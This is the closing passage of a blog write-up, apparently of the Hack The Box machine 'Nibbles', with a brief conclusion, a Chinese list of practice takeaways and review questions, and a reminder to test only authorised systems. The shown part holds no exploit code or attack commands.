+</code></pre><p>Here is the root.</p><p><img src=https://madneal.com/img/content/00db624c19dd.webp alt=AeaECQ.png decoding=async loading=lazy fetchpriority=low></p><h2 id=conclusion>Conclusion</h2><p>To be honest, the most difficult challenge of this box is to guess the password of admin of <code>nibbleblog</code>. The known vulnerability is not difficult to utilize. To obtain root shell, there are some methods to try. Some specific method cannot be utilized directly. You can try another method. Try harder!</p><h2 id=练习收获清单>练习收获清单</h2><ul><li>目录枚举发现隐藏管理端</li><li>弱口令 / 默认凭据意识</li><li>文件上传或模板注入类初始访问</li><li>权限提升前的本机枚举顺序</li></ul><h2 id=小结>小结</h2><p>Nibbles 适合练「Web 入口 + 基础提权」节奏。把每一次枚举命令的目的写下来，形成自己的检查表。</p><h2 id=复盘问题>复盘问题</h2><ul><li>哪条枚举路径浪费时间最多？</li><li>哪个假设是错的？</li><li>若重来，字典与词表如何调整？</li></ul><p>写完 flags 再写三段复盘，进步会更快。</p><h2 id=延伸阅读与实践>延伸阅读与实践</h2><p>把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。</p><p>若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。</p><p>对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。</p></article><footer class=post-footer><div class=wechat-card><p>欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：</p><img src=https://user-images.githubusercontent.com/12164075/133170982-62816554-7dd8-4e97-adbc-734f1df61e73.jpg alt=mad_coder loading=lazy decoding=async></div><ul class=post-tags><li><a href=https://madneal.com/tags/%E5%AE%89%E5%85%A8/><span class=tag>安全</span></a></li><li><a href=https://madneal.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/><span class=tag>渗透测试</span></a></li><li><a href=https://madneal.com/tags/htb/><span class=tag>HTB</span></a></li></ul><p class=post-copyright></p></footer><div id=disqus_thread><button class=comments-load type=button>加载评论</button></div><script>(function(){var e,t=document.getElementById("disqus_thread"),n=t.querySelector(".comments-load"),s=!1;function o(){if(s)return;s=!0,n.remove(),window.disqus_config=function(){this.page.url="https://madneal.com/post/nibbles-hack-the-box/"};var e=document.createElement("script");e.src="https://nealecnu.disqus.com/embed.js",e.async=!0,e.setAttribute("data-timestamp",String(Date.now())),(document.head||document.body).appendChild(e)}n.addEventListener("click",o),"IntersectionObserver"in window&&(e=new IntersectionObserver(function(t){t[0].isIntersecting&&(e.disconnect(),o())},{rootMargin:"600px 0px"}),e.observe(t))})()</script><noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript></section><footer class=site-footer><p>© 2015-2026 Neal's Blog</p><p class=footer-links><a href=https://madneal.com/about/>About</a>
+·
+<a href=https://madneal.com/privacy/>Privacy</a></p></footer><script defer src=https://madneal.com/js/bundle.js></script></body></html>
